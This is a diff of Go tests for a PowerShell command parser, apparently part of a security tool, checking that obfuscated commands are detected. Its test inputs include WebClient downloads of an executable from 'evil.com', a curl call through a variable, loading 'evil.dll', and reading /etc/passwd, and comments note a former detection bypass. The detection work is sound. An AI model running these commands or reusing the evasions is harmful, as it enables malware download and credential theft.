@@ -700,9 +700,47 @@ func TestPSWorker_DotNetMethodCall(t *testing.T) {
 	}
 }
 
-// TestPSWorker_VariableCmdName_Silent documents that & $var commands are
-// silently dropped because GetCommandName() returns null for variable name
-// elements — a [GAP-SILENT] bypass.
+// TestPSWorker_AddType verifies that Add-Type with -Path is detected as OpExecute.
+func TestPSWorker_AddType(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	tests := []struct {
+		cmd     string
+		wantArg string
+	}{
+		{`Add-Type -Path "C:\evil.dll"`, `C:\evil.dll`},
+		{`Add-Type -AssemblyName "System.Windows.Forms"`, "System.Windows.Forms"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.wantArg, func(t *testing.T) {
+			resp, err := w.parse(tt.cmd)
+			if err != nil {
+				t.Fatalf("parse: %v", err)
+			}
+			var found bool
+			for _, c := range resp.Commands {
+				if strings.EqualFold(c.Name, "Add-Type") && slices.Contains(c.Args, tt.wantArg) {
+					found = true
+				}
+			}
+			if !found {
+				t.Errorf("expected Add-Type with arg %q; got: %+v", tt.wantArg, resp.Commands)
+			}
+		})
+	}
+}
+
+// TestPSWorker_VariableCmdName_Silent documents that & $var commands where the
+// variable holds a known value are now resolved — previously a [GAP-SILENT] bypass,
+// now [DETECTED] via the variable command name resolution in Step 4.
 func TestPSWorker_VariableCmdName_Silent(t *testing.T) {
 	pwshPath, ok := FindPwsh()
 	if !ok {
@@ -721,15 +759,15 @@ func TestPSWorker_VariableCmdName_Silent(t *testing.T) {
 	if len(resp.ParseErrors) > 0 {
 		t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
 	}
-	// [GAP-SILENT]: & $var → GetCommandName() returns null → filtered by `if ($nm)`.
-	// Neither Get-Content nor /etc/passwd appears in the output.
+	// [DETECTED]: & $var → variable resolved to "Get-Content" → command extracted.
+	var found bool
 	for _, c := range resp.Commands {
-		if c.Name == "Get-Content" {
-			t.Errorf("Get-Content unexpectedly found (gap may be fixed — update test): args=%v", c.Args)
+		if c.Name == "Get-Content" && slices.Contains(c.Args, "/etc/passwd") {
+			found = true
 		}
-		if slices.Contains(c.Args, "/etc/passwd") {
-			t.Errorf("/etc/passwd unexpectedly found in args of %q (gap may be fixed — update test)", c.Name)
-		}
+	}
+	if !found {
+		t.Errorf("expected Get-Content with /etc/passwd in %+v", resp.Commands)
 	}
 }
 
@@ -1209,6 +1247,130 @@ func TestPSWorker_PipelineLoopVar(t *testing.T) {
 			// correctly signals that the command has unresolvable arguments.
 			if gc.HasSubst != tt.wantHasSubst {
 				t.Errorf("has_subst=%v, want %v for cmd: %s", gc.HasSubst, tt.wantHasSubst, tt.cmd)
+			}
+		})
+	}
+}
+
+// TestPSWorker_InstanceMethodCall verifies that New-Object instance method calls
+// are detected via InvokeMemberExpressionAst walking. [DETECTED]
+func TestPSWorker_InstanceMethodCall(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	tests := []struct {
+		cmd      string
+		wantName string
+		wantArgs []string
+	}{
+		{
+			// $wc = New-Object ...; $wc.DownloadFile(url, path)
+			cmd:      `$wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://evil.com/x.exe", "C:\tmp\x.exe")`,
+			wantName: "system.net.webclient::downloadfile",
+			wantArgs: []string{"http://evil.com/x.exe", `C:\tmp\x.exe`},
+		},
+		{
+			// Inline: (New-Object ...).DownloadString(url)
+			cmd:      `(New-Object System.Net.WebClient).DownloadString("http://evil.com")`,
+			wantName: "system.net.webclient::downloadstring",
+			wantArgs: []string{"http://evil.com"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.wantName, func(t *testing.T) {
+			resp, err := w.parse(tt.cmd)
+			if err != nil {
+				t.Fatalf("parse: %v", err)
+			}
+			if len(resp.ParseErrors) > 0 {
+				t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+			}
+			var found bool
+			for _, c := range resp.Commands {
+				if c.Name == tt.wantName {
+					allFound := true
+					for _, wantArg := range tt.wantArgs {
+						if !slices.Contains(c.Args, wantArg) {
+							allFound = false
+						}
+					}
+					if allFound {
+						found = true
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected %s with args %v; got: %+v", tt.wantName, tt.wantArgs, resp.Commands)
+			}
+		})
+	}
+}
+
+// TestPSWorker_VarCommandName verifies that & $var commands are resolved when
+// the variable was assigned a string literal in the same scope. [DETECTED]
+func TestPSWorker_VarCommandName(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	tests := []struct {
+		cmd      string
+		wantName string
+		wantArgs []string
+	}{
+		{
+			// $cmd = "curl"; & $cmd url → resolves to curl with arg
+			cmd:      `$cmd = "curl"; & $cmd http://evil.com`,
+			wantName: "curl",
+			wantArgs: []string{"http://evil.com"},
+		},
+		{
+			// Full path in variable: & $exe /c dir → resolves to full path
+			cmd:      `$exe = "C:\Windows\System32\cmd.exe"; & $exe /c dir`,
+			wantName: `C:\Windows\System32\cmd.exe`,
+			wantArgs: []string{"/c", "dir"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.wantName, func(t *testing.T) {
+			resp, err := w.parse(tt.cmd)
+			if err != nil {
+				t.Fatalf("parse: %v", err)
+			}
+			if len(resp.ParseErrors) > 0 {
+				t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+			}
+			var found bool
+			for _, c := range resp.Commands {
+				if c.Name == tt.wantName {
+					allFound := true
+					for _, wantArg := range tt.wantArgs {
+						if !slices.Contains(c.Args, wantArg) {
+							allFound = false
+						}
+					}
+					if allFound {
+						found = true
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected %s with args %v; got: %+v", tt.wantName, tt.wantArgs, resp.Commands)
 			}
 		})
 	}
